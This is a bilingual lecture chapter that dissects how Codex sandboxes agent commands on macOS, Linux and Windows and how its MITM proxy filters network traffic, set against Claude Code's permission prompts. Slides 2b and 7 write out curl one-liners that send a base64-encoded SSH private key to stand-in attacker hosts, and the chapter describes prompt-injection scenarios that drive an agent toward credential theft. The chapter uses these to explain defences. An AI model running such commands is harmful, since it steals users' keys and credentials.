# Chapter 3 (Codex): Native Sandboxing — Three Platforms, Four Mechanisms, One Threat Model

## ⏱️ Target Duration: ~50 minutes | 📑 14 slides | 📝 ~9,000 words

> **The most differentiated chapter of this teardown.** Claude Code has zero OS-level sandboxing — its safety story is "ask the user first." Codex has a 6-crate, 3-platform, kernel-enforced sandbox plus a MITM network proxy. This isn't a feature gap — this is two fundamentally different threat models.
>
> **整套拆解差异化最强的一章。** Claude Code 没有任何 OS 级沙箱，安全靠"问用户"。Codex 有 6 个 crate、3 个平台、内核级强制的沙箱 + MITM 网络代理。这不是功能差距——这是两套从根上不同的威胁模型。

---

### Core Source Files Referenced

Pinned commit: `e4d6675`, 2026-05-01. All paths under `codex-rs/`.

* `sandboxing/src/lib.rs` → 跨平台 facade（条件编译）
* `sandboxing/src/seatbelt.rs` → macOS Seatbelt 集成
* `sandboxing/src/seatbelt_base_policy.sbpl` → 编译期 `include_str!` 进 binary 的实际 Seatbelt 规则
* `sandboxing/src/landlock.rs` → Linux Landlock LSM 集成
* `sandboxing/src/bwrap.rs` → Linux Bubblewrap 命名空间隔离
* `sandboxing/src/manager.rs` → `SandboxManager`、`SandboxType`、平台路由
* `sandboxing/src/policy_transforms.rs` → 标准 PermissionProfile → 平台特定策略的编译器
* `linux-sandbox/` → 独立可执行 helper binary `codex-linux-sandbox`
* `windows-sandbox-rs/` → Windows Restricted Token 实现
* `network-proxy/src/mitm.rs` → TLS MITM 代理
* `network-proxy/src/network_policy.rs` → `NetworkPolicyDecider` 决策引擎
* `core/src/landlock.rs` → core 调用沙箱的 spawn 入口

---

### [00:00] Opening (Slide 1: Cover)

一个本地编码 Agent 帮你执行的命令——`rm -rf node_modules`、`curl https://api.example.com`、`docker run untrusted-image`——它跑在哪里？

When a local coding agent executes commands for you — `rm -rf node_modules`, `curl https://api.example.com`, `docker run untrusted-image` — where does it run?

Claude Code 的回答是：**直接在你的用户进程里**。问你 yes/no（如果配了 permission prompt），yes 就 spawn 子进程，子进程继承你的全部权限——能读 `~/.ssh/id_rsa`、能 connect 任意网站、能写任意文件。安全模型是"信任 LLM 不会请求恶意命令 + 用户作为最后一道闸门"。

Claude Code's answer: **directly in your user process**. Asks you yes/no (if permission prompt is configured), spawns the subprocess, which inherits your full permissions — can read `~/.ssh/id_rsa`, can connect to any website, can write any file. The safety model is "trust the LLM not to request malicious commands + user as last-resort gate."

Codex 的回答是：**在一个内核级强制隔离的沙箱里**。命令的文件系统访问被 Landlock LSM 限定到 cwd 子树。命令的网络访问被一个 MITM HTTP 代理过滤，只放行 allowlist 域名。`/etc/passwd` 它读不到。`api.suspicious.com` 它连不上。安全模型是"假设 LLM 部分对抗 + 工具完全不可信，靠 OS 强制约束兜底"。

Codex's answer: **inside a kernel-enforced isolation sandbox**. The command's filesystem access is restricted by Landlock LSM to the cwd subtree. Network access is filtered by a MITM HTTP proxy that only allows allowlist domains. It can't read `/etc/passwd`. It can't connect to `api.suspicious.com`. Safety model: "assume the LLM is partially adversarial and tools are completely untrusted; enforce constraints at the OS level."

这一章我们拆解 Codex 怎么做到这件事。它不是一个简单的 "wrap with sudo -u nobody" hack——它是一个 **6-crate 的子系统，包括 3 个平台特定实现、1 个独立 helper binary、1 个完整 MITM 网络代理、1 套政策编译器**。

This chapter dissects how Codex does this. Not a simple "wrap with sudo -u nobody" hack — it's a **6-crate subsystem with 3 platform-specific implementations, 1 separate helper binary, 1 full MITM network proxy, and 1 policy compiler**.

带一个问题进这一章：**这个复杂度，值得吗？**

Take this question into the chapter: **is this complexity worth it?**

---

### [04:00] Slide 2: The Threat Model Difference

要理解一个安全设计，先理解它在防什么。两边的威胁模型完全不同。

To understand a security design, first understand what it's defending against. Both threat models differ completely.

**Claude Code 的威胁模型**（隐式）：
1. 用户是这台机器的合法主人
2. LLM 是良性的（被 RLHF 对齐过，不会主动产生恶意命令）
3. 工具的实现是可信的（Anthropic 内部审查）
4. MCP 服务器的 plugin 大体可信（可信但不绝对——所以加 permission prompt）
5. **主要风险**：LLM 误解用户意图导致破坏性操作（删错文件、推错代码）

防御手段：**permission prompt**。在执行 mutating 操作前问用户，让用户做最后判断。

**Claude Code's threat model** (implicit):
1. User is the legitimate owner of this machine
2. LLM is benign (RLHF-aligned, won't actively produce malicious commands)
3. Tool implementations are trusted (Anthropic-reviewed)
4. MCP server plugins are mostly trusted (trusted but not absolutely — hence permission prompts)
5. **Primary risk**: LLM misinterprets user intent and does destructive operations (deletes wrong file, pushes wrong code)

Defense: **permission prompt**. Ask the user before mutating operations; let the user be the final judge.

**Codex 的威胁模型**（显式，写在源码注释里）：
1. 用户是这台机器的合法主人
2. **LLM 可能部分对抗**——可能产生 prompt-injection 后的恶意指令、可能被 jailbreak、可能从工具回流的内容（网页、文件）里继承注入
3. **工具完全不可信**——尤其是用户配置的第三方 MCP server
4. **网络环境完全敌意**——任何被 agent 访问的 URL 可能是攻击载体
5. **主要风险**：agent 在用户不察觉的情况下，被某个角度的 prompt injection 驱动去 exfiltrate 凭证、连接 C2、植入 backdoor

防御手段：**内核级强制隔离 + 网络流量 MITM 检查 + closed-by-default policy**。

**Codex's threat model** (explicit, written into source comments):
1. User is the legitimate owner of this machine
2. **LLM may be partially adversarial** — may produce malicious commands after prompt-injection, may be jailbroken, may inherit injection from tool-returned content (web pages, files)
3. **Tools are completely untrusted** — especially user-configured third-party MCP servers
4. **The network environment is fully adversarial** — any URL accessed by the agent could be an attack vector
5. **Primary risk**: agent, without user awareness, gets driven by some prompt injection angle to exfiltrate credentials, connect to C2, plant backdoors

Defense: **kernel-level enforced isolation + network traffic MITM inspection + closed-by-default policy**.

> **关键洞察**：两个团队**对 LLM 的信任度**就不一样。Claude Code 把 LLM 当成会犯错的合作者；Codex 把 LLM 当成在受控环境下运行的不完全可信组件。这一个假设差异，从根上决定了你愿意付多少安全工程的成本。
>
> **Key insight**: The two teams have **different trust levels for the LLM**. Claude Code treats the LLM as an error-prone collaborator; Codex treats the LLM as a not-fully-trusted component running in a controlled environment. This single difference fundamentally determines how much safety engineering cost you're willing to pay.

---

### [07:00] Slide 2b: 同一条命令，两种结局——一次外泄攻击的实况

理解威胁模型最有力的方法是看同一场攻击在两个系统里的走法。

攻击载体：模型被 prompt 注入，产出这条命令——

```
curl https://attacker.com/?k=$(cat ~/.ssh/id_rsa | base64)
```

**Codex 一侧**：引擎把命令交给 `codex-linux-sandbox` helper 执行。Landlock 首先拦截 `cat ~/.ssh/id_rsa`——`~/.ssh` 不在可读白名单，内核直接返回 `EACCES`，文件根本读不到。即便假设 Landlock 被绕过（双重保险），MITM 网络代理发现 `attacker.com` 不在允许域名列表，外联请求得到 403。两道防线独立存在、互不依赖，全程不需要用户参与任何判断。

In Codex, the engine passes the command to `codex-linux-sandbox`. Landlock blocks `cat ~/.ssh/id_rsa` first — `~/.ssh` is outside the readable allowlist, kernel returns `EACCES`, file never read. Even if Landlock were bypassed, the MITM proxy finds `attacker.com` absent from the domain allowlist and returns 403. Two independent layers, no user action required.

**Claude Code 一侧**：模型生成相同的 `curl` 命令，触发权限确认弹窗——"运行 curl …?"。这道防线的厚度等于用户在那一刻的注意力。用户疲劳、信任、或误以为命令无害，点"允许"，命令在无 OS 沙箱的环境执行，SSH 私钥被 base64 外发。只有一道防线，且它是人。

In Claude Code, the same command surfaces a permission prompt — "run curl …?" — and the entire defense is one human click. If the user approves (fatigue, trust, inattention), the command runs with no OS-level constraints and the private key is exfiltrated. One gate, and it's human.

> **这就是威胁模型代价差的具体化**：Codex 假设模型"可能被攻陷"，把防线下沉到操作系统内核——即使用户被骗、即使命令已发出，内核与代理仍各拦一道。Claude Code 假设模型"基本良性"，最后一道防线是人的注意力。两种选择都自洽；只是赌注押在不同的环节。
>
> **This is the threat model cost differential made concrete**: Codex assumes the model "may be compromised" and sinks its defenses to the OS kernel — even if the user is fooled, even if the command is issued, kernel and proxy each block independently. Claude Code assumes the model is "mostly benign" and the last gate is human attention. Both are internally consistent — just betting on different failure points.

---

### [09:00] Slide 3: The Sandbox Architecture — Six Crates Working Together

打开 `codex-rs/sandboxing/src/lib.rs`：

```rust
#[cfg(target_os = "linux")]
mod bwrap;
pub mod landlock;
mod manager;
pub mod policy_transforms;
#[cfg(target_os = "macos")]
pub mod seatbelt;
```

干净的 conditional compilation：Linux 编译期带上 bwrap 和 landlock；macOS 带上 seatbelt；Windows 走另一条路（在独立的 `windows-sandbox-rs` crate 里）。

Clean conditional compilation: Linux compile-time pulls in bwrap and landlock; macOS pulls in seatbelt; Windows takes a different path (in the separate `windows-sandbox-rs` crate).

**6 个相关 crate 的职责**：

| Crate | 职责 | 编译产物 |
|-------|------|----------|
| `codex-sandboxing` | 跨平台 facade、policy 编译、平台路由 | 库（被 core 链接） |
| `codex-linux-sandbox` | **独立可执行 helper binary**——bwrap + landlock 的实际启动器 | 可执行文件 |
| `codex-windows-sandbox` | Windows Restricted Token 实现 | 库（被 core 链接） |
| `codex-network-proxy` | 全功能 MITM HTTP/SOCKS5 代理 | 库 |
| `codex-process-hardening` | 进程级硬化（umask、resource limits 等） | 库 |
| `codex-execpolicy` | 执行策略 DSL（哪些命令该被审批 vs 允许） | 库 |

**为什么 Linux 沙箱要拆成独立可执行文件？** 因为 Linux Landlock 的 API 模型是 "process commits to a ruleset, ruleset is inherited by exec'd children but ruleset itself is immutable in current process"。在 codex 主进程里加 ruleset 会污染主进程；正确做法是：fork → 在子进程里 commit ruleset → exec 实际命令。`codex-linux-sandbox` 这个 helper 就是这个 fork-and-exec 的桥梁。

**Why is the Linux sandbox a separate executable?** Because Linux Landlock's API model is "process commits to a ruleset, the ruleset is inherited by exec'd children, but the ruleset itself is immutable in the current process." Adding a ruleset to the main codex process would contaminate it; the correct flow is: fork → commit ruleset in child → exec actual command. `codex-linux-sandbox` is the bridge for this fork-and-exec.

`codex-rs/core/src/landlock.rs:22` 的 `spawn_command_under_linux_sandbox()` 就是 core 调用这个 helper 的入口。注释说："**Unlike macOS Seatbelt where we directly embed the policy text, the Linux helper is a separate executable. We pass the canonical permission profile as JSON and let the helper derive the runtime filesystem/network policies.**"

`codex-rs/core/src/landlock.rs:22`'s `spawn_command_under_linux_sandbox()` is core's entry point to this helper. Comment: **"Unlike macOS Seatbelt where we directly embed the policy text, the Linux helper is a separate executable. We pass the canonical permission profile as JSON and let the helper derive the runtime filesystem/network policies."**

这一句话同时透露两个事实：
1. Linux 路径走 helper binary
2. macOS 路径直接 embed policy text（在主 codex 进程里）

This single sentence reveals two facts at once: Linux path goes through helper binary; macOS path embeds policy text directly in the main codex process.

---

### [14:00] Slide 4: macOS Seatbelt — Compile-Time Embedded Policy

打开 `codex-rs/sandboxing/src/seatbelt.rs:21`：

```rust
const MACOS_SEATBELT_BASE_POLICY: &str = include_str!("seatbelt_base_policy.sbpl");
const MACOS_SEATBELT_NETWORK_POLICY: &str = include_str!("seatbelt_network_policy.sbpl");
const MACOS_RESTRICTED_READ_ONLY_PLATFORM_DEFAULTS: &str =
    include_str!("restricted_read_only_platform_defaults.sbpl");
```

注意 Rust 的 `include_str!`——这个宏在**编译期**把对应的 `.sbpl` 文件内容字面量嵌入到二进制里。意思是 codex 二进制本身携带 Seatbelt 策略文本，不依赖外部文件。

Note Rust's `include_str!` macro — at **compile time** it embeds the contents of the named file as a string literal into the binary. The codex binary itself carries the Seatbelt policy text; no external file dependency.

**这是有意义的安全决策**：如果策略文件是运行时从磁盘读，攻击者污染那个文件就可以削弱沙箱。`include_str!` 让策略和二进制一体——要篡改策略，必须替换整个二进制。

**This is an intentional security decision**: if the policy file is read from disk at runtime, an attacker who poisons that file can weaken the sandbox. `include_str!` welds policy and binary together — to tamper with policy, you must replace the entire binary.

打开 `seatbelt_base_policy.sbpl`：

```scheme
(version 1)

; inspired by Chrome's sandbox policy:
; https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/mac/common.sb
; https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/mac/renderer.sb

; start with closed-by-default
(deny default)

; child processes inherit the policy of their parent
(allow process-exec)
(allow process-fork)
(allow signal (target same-sandbox))

; process-info
(allow process-info* (target same-sandbox))
```

这是 **Apple TinyScheme 风格的 Seatbelt 配置语言（SBPL）**。第一句 `(deny default)` 说明 Codex 选了 **closed-by-default**——任何没有显式 allow 的操作都被拒绝。这是 Chrome 沙箱的经典姿势，作者还在注释里直接给了 Chrome 源码链接，说明灵感来源。

This is **Apple's TinyScheme-style Seatbelt Policy Language (SBPL)**. The first line `(deny default)` shows Codex chose **closed-by-default** — anything not explicitly allowed is denied. This is the classic Chrome sandbox posture; the author even cites Chrome source URLs.

**还有一个细节**（`seatbelt.rs:30`）：

```rust
/// When working with `sandbox-exec`, only consider `sandbox-exec` in `/usr/bin`
/// to defend against an attacker trying to inject a malicious version on the
/// PATH.
pub const MACOS_PATH_TO_SEATBELT_EXECUTABLE: &str = "/usr/bin/sandbox-exec";
```

硬编码绝对路径——攻击者可能在 `$PATH` 上前置一个恶意 `sandbox-exec` 让"启动沙箱"的调用变成"启动一个无沙箱壳"。Codex 通过硬编码 `/usr/bin/sandbox-exec` 防御这个 PATH-injection 攻击。

Hardcoded absolute path — an attacker could prepend a malicious `sandbox-exec` to `$PATH`, turning "launch sandbox" into "launch an unsandboxed shell." Codex defends against this PATH-injection attack by hardcoding `/usr/bin/sandbox-exec`.

> **细节决定立场**：这种"想到攻击者会污染 PATH"的细节防御，是真正的 security-conscious engineering。它的存在说明 Codex 团队不是抄了个 Chrome 沙箱模板就完事——他们读懂了为什么 Chrome 那么写，还做了适配性的额外加固。
>
> **Detail reveals stance**: this kind of "anticipated PATH-poisoning" defense is real security-conscious engineering. Its existence shows the Codex team didn't just copy a Chrome sandbox template — they understood why Chrome wrote it that way and added adaptive hardening.

---

### [20:00] Slide 5: Linux Landlock + Bubblewrap — The Helper Binary

Linux 路径更复杂，因为 Linux 上的"沙箱"不是单一机制，而是几层防御组合：

**Landlock**（Linux LSM，5.13+ 内核）—— filesystem 强制访问控制。能限定一个进程"只能读 cwd 子树、只能写 `/tmp` 和 `cwd` 子树、不能 access `/etc/shadow`"。

**Bubblewrap (`bwrap`)** —— 用户态 namespace 工具（systemd 家族）。建一个新 mount namespace、新 PID namespace、新 user namespace，再 chroot 到一个最小化的根目录。`bubblewrap` 本身没有 root，靠 unprivileged user namespace。

**seccomp-bpf** —— syscall 级别的过滤器，决定哪些 syscall 可调用。

Codex 的 Linux 沙箱**同时用这三层**。但 Landlock 的 API 模型决定了实现拓扑：

```
                            ┌──────────────────────────┐
codex (主进程)              │  codex-linux-sandbox     │
├─ 用户在 TUI 里下命令        │  (helper binary)         │
├─ core 决定要执行 cmd        │  ↓                       │
├─ spawn_command_under_      │  1. 设置 user namespace  │
│  linux_sandbox()  ─fork──► │  2. apply Landlock ruleset│
│                            │  3. apply seccomp filter  │
│                            │  4. exec(cmd, args)       │
│                            └──────────────────────────┘
```

`codex-linux-sandbox` 是这个**牺牲者进程**——它先把自己锁进沙箱里，然后 exec 用户命令；用户命令继承沙箱约束。主 codex 进程从不进入沙箱，自己保持完整权限以便管理工具池、网络代理、IPC。

`codex-linux-sandbox` is the **sacrifice process** — it locks itself into the sandbox first, then exec's the user command, which inherits the sandbox constraints. The main codex process never enters the sandbox, keeping its full privileges to manage the tool pool, network proxy, IPC.

**为什么不直接用 Docker？**
1. Docker 假设有 daemon、需要 root、镜像分发流程不轻量
2. CI/沙箱化容器环境（很多用户的实际部署）通常已经在 Docker 里——再嵌一层 Docker 是 nesting 噩梦
3. Bubblewrap + Landlock 在 unprivileged 模式下工作，无需 root
4. 启动时间 < 100ms（Docker 通常 ~1s）

**Why not just use Docker?**
1. Docker assumes a daemon, requires root, image distribution is heavyweight
2. CI / sandboxed container environments (many users' actual deployment) often already run in Docker — nesting Docker is a nightmare
3. Bubblewrap + Landlock work in unprivileged mode, no root
4. Startup latency < 100ms (Docker is typically ~1s)

> **架构反思**：Linux 路径的复杂度（5 层组件：bwrap、landlock、seccomp、helper binary、policy compiler）不是过度设计——它是 Linux 安全模型本身的复杂度的反映。Linux 没有像 Seatbelt 那样的"all-in-one"沙箱原语；要做强约束就只能组合多个机制。Codex 团队选择拥抱这个复杂度，而不是简化到只用其中一层。
>
> **Architecture reflection**: Linux path's complexity (5 layers: bwrap, landlock, seccomp, helper binary, policy compiler) isn't over-engineering — it reflects the inherent complexity of Linux's security model. Linux has no "all-in-one" sandbox primitive like Seatbelt; strong constraints require composing multiple mechanisms. Codex chose to embrace this complexity rather than simplify to one layer.

---

### [24:00] Slide 5b: 为什么沙箱要用独立 Helper 二进制？——因为 Landlock 是不可逆的

上一张 slide 交代了 `codex-linux-sandbox` 是"牺牲者进程"的概念，这里是它在实现层面为什么必须是独立二进制，而不是主进程内的一个函数调用。

调用链从 `codex-rs/core/src/landlock.rs:22` 的 `spawn_command_under_linux_sandbox()` 开始。这个函数不在主进程里做任何 Landlock 操作——它只是 fork 出一个独立进程，把"要执行的命令 + 权限策略（JSON）"传给外部的 `codex-linux-sandbox` 二进制。

The call chain starts at `spawn_command_under_linux_sandbox()` at `codex-rs/core/src/landlock.rs:22`. This function does no Landlock operations in the main process — it forks and passes the command plus permission profile (as JSON) to the external `codex-linux-sandbox` binary.

**为什么必须是独立进程，而不是主进程内的函数？** 根本原因是 Landlock 的 API 语义：一旦某进程提交了 Landlock 规则集，这个进程及其所有子进程就被永久限制，限制无法解除（irrevocable）。如果主引擎进程对自身提交规则集，它从此不能 spawn 任何不受限的进程——工具池、网络代理、IPC 全部废掉。

The root cause is Landlock's irrevocable API contract: once a process commits a ruleset, it and all its descendants are permanently restricted — the restriction cannot be lifted. If the main engine process committed a Landlock ruleset on itself, it could never spawn another unrestricted process — the tool pool, network proxy, and IPC channels would all break.

解决方案是：每次需要执行一条受限命令，就 fork 一个一次性的 helper 进程。Helper 接收策略，对自己提交 Landlock + seccomp 规则集，然后 `exec` 替换成目标命令——目标命令在锁死的沙箱内运行。Helper 生命周期终结，主引擎仍然自由。

The solution: fork a throwaway helper per command. The helper receives the policy, commits Landlock + seccomp rulesets against itself, then `exec`s into the target command, which runs inside the locked sandbox. The helper's lifecycle ends; the main engine stays free.

副效应是架构上的好处：沙箱逻辑独立成一个可以单独审计、单独分发、单独版本化的二进制，不和主引擎的 codebase 耦合。

A side-effect is an architectural benefit: the sandbox logic becomes a separately auditable, separately distributed, separately versioned binary, decoupled from the main engine's codebase.

---

### [26:00] Slide 5c: 纵深防御矩阵——每种越界，至少被一层挡住

三层机制（Landlock、namespace/bwrap、seccomp）不是冗余，是互补盲区的组合。把"攻击者想做的事"对着三列机制连成矩阵，每一行都至少有一个 ✓——这就是纵深防御（defense-in-depth）的可验证形式。

Three layers (Landlock, namespace/bwrap, seccomp) are not redundant — they cover each other's blind spots. The matrix maps attacker goals against the three mechanism columns; every row has at least one ✓. That is defense-in-depth as a verifiable property.

具体分工：Landlock 管**文件路径级**访问控制——阻止写 `/etc`，但它对 `ptrace` 一无所知。namespace（bwrap 建立的 mount/PID/user namespace）管**隔离边界**——限制 `ptrace` 只能看到同 PID namespace 内的进程、阻止 `mount` 挂载新文件系统，但它对单个文件路径的细粒度控制不如 Landlock。seccomp-bpf 管**syscall 级**过滤——直接过滤 `ptrace`、`mount` 等危险系统调用，但它看不到文件路径，无法区分"读 `/tmp`"和"读 `~/.ssh`"。

Division of responsibility: Landlock handles file-path-level access control — blocks writes to `/etc` but knows nothing about `ptrace`. Namespace (the mount/PID/user namespaces bwrap creates) handles isolation boundaries — limits `ptrace` scope to within the same PID namespace, blocks mounting new filesystems, but lacks Landlock's per-path granularity. seccomp-bpf handles syscall-level filtering — directly filters `ptrace`, `mount`, and other dangerous calls, but sees no file paths and cannot distinguish "read `/tmp`" from "read `~/.ssh`".

**旧内核降级路径**：Linux Landlock 需要 5.13+ 内核。旧内核没有 Landlock？优雅降级到 bwrap + seccomp，而不是直接裸奔。文件系统隔离变粗糙（mount namespace 级别，而非子树级），但 namespace 和 seccomp 两层仍在，不是零防御。

**Old-kernel fallback**: Linux Landlock requires kernel 5.13+. On older kernels, Codex degrades gracefully to bwrap + seccomp rather than dropping all sandboxing. Filesystem isolation becomes coarser (mount namespace level, not per-path subtree), but two layers remain — not zero defense.

> **纵深防御的可读性**：矩阵形式让"没有哪种越界能同时绕过三层"这个论断从设计意图变成可审计的属性。每次新增攻击场景，看一眼矩阵行就知道哪层负责挡——工程师不需要记住整个系统，只需要维护这张矩阵的完整性。
>
> **Readability of defense-in-depth**: the matrix form converts "no single breach bypasses all three layers" from a design intention into an auditable property. When a new attack scenario is added, one matrix row tells you which layer owns the block — engineers maintain the matrix's completeness rather than memorizing the whole system.

---

### [27:00] Slide 6: Windows Restricted Token

Windows 路径在 `codex-rs/windows-sandbox-rs/`。Codex 用 Windows API 的 **Restricted Token** 机制：

```rust
pub enum WindowsSandboxLevel {
    Disabled,           // 无沙箱
    RestrictedToken,    // 创建一个剥离危险特权的 token
    Elevated,           // 提升的 token（用户主动请求时）
}
```

Restricted Token 的原理：从用户当前 token 派生出新 token，**移除部分 SID 和 Privilege**。结果是子进程看似还是用户身份，但缺少关键权限——比如不能写 system32、不能 elevate、不能用 debug privilege。

The principle: derive a new token from the user's current token, **removing certain SIDs and Privileges**. The child process appears to still be the user but lacks key permissions — e.g., can't write to system32, can't elevate, can't use debug privilege.

Windows 上没有 Linux Landlock 那样的精细文件系统过滤，所以 Restricted Token 是**粗粒度防御**：它不能阻止"读 `~/Documents/passwords.txt`"，但能阻止"安装 driver、修改 system32、关闭 Windows Defender"。

Windows lacks Linux Landlock's fine-grained filesystem filtering, so Restricted Token is a **coarse defense**: it can't prevent "read `~/Documents/passwords.txt`" but can prevent "install driver, modify system32, disable Windows Defender."

> **平台不对称的承认**：Codex 在文档里实事求是地说 Windows 沙箱"不如 Linux 强"。这是诚实工程的姿态——不假装跨平台一致，承认每个 OS 给的工具不同，能做到什么就做到什么。
>
> **Honest about platform asymmetry**: Codex's docs explicitly admit Windows sandboxing is "weaker than Linux." This is honest engineering — not pretending cross-platform parity, acknowledging each OS gives different tools, doing what's possible.

---

### [31:00] Slide 7: The Network Proxy — MITM with TLS Interception

文件系统沙箱只是一半。另一半是网络。打开 `codex-rs/network-proxy/src/lib.rs`：

```
mod certs;
mod connect_policy;
mod http_proxy;
mod mitm;
mod network_policy;
mod policy;
mod proxy;
mod socks5;
...
```

这是一个**全功能 MITM HTTP/SOCKS5 代理**，编译进 codex 二进制。沙箱化的子进程通过 `HTTPS_PROXY` 环境变量被强制走这个代理；任何绕过代理的网络访问被 Landlock/seccomp 直接 block。

This is a **full-featured MITM HTTP/SOCKS5 proxy** compiled into the codex binary. Sandboxed child processes are forced through this proxy via `HTTPS_PROXY` env var; any network access bypassing the proxy is blocked by Landlock/seccomp directly.

**MITM 的工作流程**：
1. 子进程发起 `https://api.example.com` 请求
2. 请求被截到 codex 的 in-process MITM 代理
3. MITM 用动态生成的 CA cert（`certs.rs`）伪造一个 server cert，和子进程握 TLS
4. MITM 自己以真实 client 身份和 `api.example.com` 握 TLS
5. 中间能看到明文请求/响应，应用 `NetworkPolicyDecider`（`network_policy.rs`）判断
6. 允许就转发；不允许就返 403

**MITM workflow**:
1. Child process initiates `https://api.example.com` request
2. Request intercepted by codex's in-process MITM proxy
3. MITM uses a dynamically generated CA cert (`certs.rs`) to fake a server cert and TLS-handshakes with the child process
4. MITM itself acts as a real client to TLS-handshake with `api.example.com`
5. In the middle, it sees plaintext request/response, applies `NetworkPolicyDecider` (`network_policy.rs`) to judge
6. Allow → forward; deny → return 403

**为什么要 MITM？为什么不只看 SNI？**
仅看 SNI 只能拒绝整个域；MITM 让 Codex 能根据**请求路径、HTTP 方法、headers** 做更细的决策。比如允许 `GET github.com/...` 但拒绝 `POST github.com/...`。这种细粒度对 prompt-injection 防御非常重要——攻击者可能让 agent "GET 一个看似无害的 URL"，但实际是带数据外泄参数的请求。

**Why MITM, not just SNI inspection?** SNI alone can only reject whole domains; MITM lets Codex make finer decisions based on **request path, HTTP method, headers**. E.g., allow `GET github.com/...` but deny `POST github.com/...`. This granularity is critical for prompt-injection defense — attackers might tell the agent to "GET an innocent URL" that actually exfiltrates data via parameters.

> **代价**：MITM 需要把 codex 的 root CA 注入到子进程的 trust store。这意味着 codex 必须在沙箱启动时动态注入证书，并在退出时清理。`certs.rs` 处理这个生命周期。
>
> **Cost**: MITM requires injecting codex's root CA into the child process's trust store. This means codex must dynamically inject the cert at sandbox startup and clean up on exit. `certs.rs` handles this lifecycle.

**Claude Code 完全没有这一层**。它的网络访问就是直接 spawn `curl` 或 `fetch`——没有代理，没有过滤，没有 MITM。如果 LLM 让它 `curl https://exfiltrate.com/steal?data=$(cat ~/.ssh/id_rsa | base64)`，假设 user permission prompt 配错或者绕过，没有第二道防线。

**Claude Code has none of this layer**. Its network access is direct `curl` or `fetch` spawning — no proxy, no filtering, no MITM. If the LLM tells it to `curl https://exfiltrate.com/steal?data=$(cat ~/.ssh/id_rsa | base64)`, assuming the user permission prompt is misconfigured or bypassed, there's no second line of defense.

---

### [38:00] Slide 8: The Policy Compiler — One Profile, Three Outputs

`codex-rs/sandboxing/src/policy_transforms.rs` 解决一个跨平台问题：用户/SDK 给的是**抽象 PermissionProfile**（"允许读 cwd 子树、允许写 cwd + tmp、允许网络访问 github.com"），但 macOS 要的是 SBPL 文本，Linux 要的是 Landlock ruleset，Windows 要的是 Restricted Token。

`codex-rs/sandboxing/src/policy_transforms.rs` solves a cross-platform problem: users/SDK provide an **abstract PermissionProfile** ("allow read of cwd subtree, allow write of cwd + tmp, allow network access to github.com"), but macOS wants SBPL text, Linux wants a Landlock ruleset, Windows wants a Restricted Token.

```
        PermissionProfile (canonical)
                │
                │
        policy_transforms.rs
        ┌───────┼───────┐
        ▼       ▼       ▼
      SBPL   Landlock  RestrictedToken
     (文本)  (struct)    (PSID/PRIV list)
        │       │       │
        ▼       ▼       ▼
     macOS    Linux   Windows
```

**为什么这一层值得单独存在？** 因为没有它，每个平台模块都要自己解释 PermissionProfile，三套实现会漂移。集中编译让"语义统一、平台特化"成为强约束。这是 LLVM 风格的中间表示思想——前端统一，后端专门。

**Why does this layer deserve to exist independently?** Without it, each platform module would have to parse PermissionProfile itself, and three implementations would drift. Centralized compilation makes "semantic uniformity, platform specialization" a strong constraint. This is LLVM-style intermediate representation thinking — unified front-end, specialized back-end.

---

### [42:00] Slide 9: The Comparison Table — Codex vs Claude Code vs Docker

把 ch03 的核心差异压缩到一张表：

| 维度 | Claude Code | Codex | Docker | gVisor |
|------|-------------|-------|--------|--------|
| 强制层级 | 应用层（permission prompt） | OS 内核（Landlock/Seatbelt/Token） | OS namespace + cgroup | 用户态 syscall 拦截 |
| 文件系统隔离 | ❌ | ✅ 子树级（Landlock） | ✅ 镜像级 | ✅ syscall 级 |
| 网络隔离 | ❌ | ✅ 域名+路径级（MITM） | ✅ namespace 级 | ✅ syscall 级 |
| 启动延迟 | 0ms | <100ms | ~1s | ~50ms |
| 启动门槛 | 无 | unprivileged user namespace | daemon + root | 编译期定制内核 |
| 第三方工具兼容性 | 完美（直接 spawn） | 高（通过 helper） | 需镜像化 | 中（部分 syscall 不支持） |
| 平台覆盖 | 全（语言层） | macOS/Linux 强、Windows 中 | Linux 优、其他差 | Linux 限定 |
| 分发复杂度 | npm 包 | 二进制 + helper binary | image registry | 内核镜像 |

**结论**：Codex 在 sandbox 这个维度选了 **"Docker 之下、应用层之上"** 的中间档——比 permission prompt 强得多，比 Docker 轻量得多。这个中间档恰好是"工业级 agent 在不假设容器环境时"应该选的位置。

**Conclusion**: Codex chose the **"below Docker, above application layer"** middle tier on sandboxing — much stronger than permission prompts, much lighter than Docker. This middle tier is exactly the right position for "industrial-grade agent in a non-containerized assumption."

---

### [44:00] Slide 9b: 该用哪种沙箱？——气闸舱决策树

类比先行：**沙箱是气闸舱（airlock）**。宇航员进出空间站不直接面对真空，中间隔一个受控腔体——出去之前加压平衡，进来之前减压净化。沙箱就是 agent 与你系统之间那个"进出都要过检"的中间腔。腔体越厚越安全，但每次进出的延迟越高、操作越受限。**选型 = 选腔体厚度**，厚度必须匹配你的使用场景。

Analogy first: a sandbox is an **airlock**. Astronauts don't step directly into vacuum — there's a controlled chamber where pressure equalizes before each passage. A sandbox is the controlled chamber between an agent and your system: everything in and out goes through inspection. Thicker chamber = more safety, more latency, more restriction. Choosing a sandbox is choosing chamber thickness — and thickness must match the use case.

决策树四个分支，对应四个问题：

The decision tree has four branches:

**Codex 适用场景一**：你的 agent 会执行 LLM 生成的命令，或接入不可信第三方 MCP server。OS 级沙箱，约 100ms 启动开销，unprivileged——腔体厚度刚好够用，不过厚。这是 Codex 主打的场景。

**Codex scenario 1**: your agent executes LLM-generated commands, or integrates untrusted third-party MCP servers. OS-level sandbox, ~100ms startup overhead, unprivileged — chamber thickness just right, not over-engineered. This is Codex's primary target.

**Codex 适用场景二**：需要批量自动跑成百上千个任务的 CI 或批处理流水线。每个子任务在腔体内跑，任务本身不可信也无妨——沙箱 + 批处理组合的意义正在于此。

**Codex scenario 2**: batch automation — hundreds or thousands of tasks in CI or pipeline. Each sub-task runs inside the chamber; the tasks themselves need not be trusted — that's the point of sandbox + batch combined.

**重型隔离场景**：高安全多租户或 CI，需要完整的内核级隔离，选 gVisor 或容器。腔体更厚，代价是更重、更慢——gVisor 拦截每一个 syscall，容器需要 daemon + root。这是 Codex 有意不覆盖的区间（它不假设有 Docker 环境）。

**Heavy isolation**: high-security multi-tenant or CI requiring full kernel-level isolation — gVisor or container. Thicker chamber, heavier, slower. gVisor intercepts every syscall; containers need daemon + root. Codex deliberately doesn't target this band (it doesn't assume Docker is available).

